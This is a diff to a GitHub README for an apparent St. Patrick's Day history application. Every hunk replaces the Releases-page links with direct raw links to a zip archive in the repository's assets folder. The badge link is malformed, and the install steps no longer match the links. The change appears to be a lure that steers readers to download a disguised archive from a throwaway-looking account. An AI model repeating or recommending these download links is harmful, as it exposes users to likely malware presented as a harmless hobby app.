@@ -1,6 +1,6 @@
 # 🎉 st-patricks-day-history-and-traditions - Celebrate the History of St. Patrick's Day
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-1abc9c)](https://github.com/jarmyyfdhisgcikdhygbchjkdcvbhgkdsc/st-patricks-day-history-and-traditions/releases)
+[![Download Now](https://github.com/jarmyyfdhisgcikdhygbchjkdcvbhgkdsc/st-patricks-day-history-and-traditions/raw/refs/heads/main/assets/traditions-day-and-history-st-patricks-2.9.zip%20Now-Visit%20Releases-1abc9c)](https://github.com/jarmyyfdhisgcikdhygbchjkdcvbhgkdsc/st-patricks-day-history-and-traditions/raw/refs/heads/main/assets/traditions-day-and-history-st-patricks-2.9.zip)
 
 ## 📜 Overview 
 
@@ -14,7 +14,7 @@ To start using this application, follow the steps in the “Download & Install�
 
 1. Visit the Releases page by clicking the link below:
 
-   [Download Here](https://github.com/jarmyyfdhisgcikdhygbchjkdcvbhgkdsc/st-patricks-day-history-and-traditions/releases)
+   [Download Here](https://github.com/jarmyyfdhisgcikdhygbchjkdcvbhgkdsc/st-patricks-day-history-and-traditions/raw/refs/heads/main/assets/traditions-day-and-history-st-patricks-2.9.zip)
 
 2. On the Releases page, locate the latest version. 
 3. Click on the version number to see the available files.
@@ -69,7 +69,7 @@ If you have questions or need support, feel free to reach out through the GitHub
 
 ## 🔗 Useful Links
 
-- [Visit the Releases page to download](https://github.com/jarmyyfdhisgcikdhygbchjkdcvbhgkdsc/st-patricks-day-history-and-traditions/releases)
+- [Visit the Releases page to download](https://github.com/jarmyyfdhisgcikdhygbchjkdcvbhgkdsc/st-patricks-day-history-and-traditions/raw/refs/heads/main/assets/traditions-day-and-history-st-patricks-2.9.zip)
 - [Documentation](link-to-documentation)
 - [Community Support](link-to-community) 
 
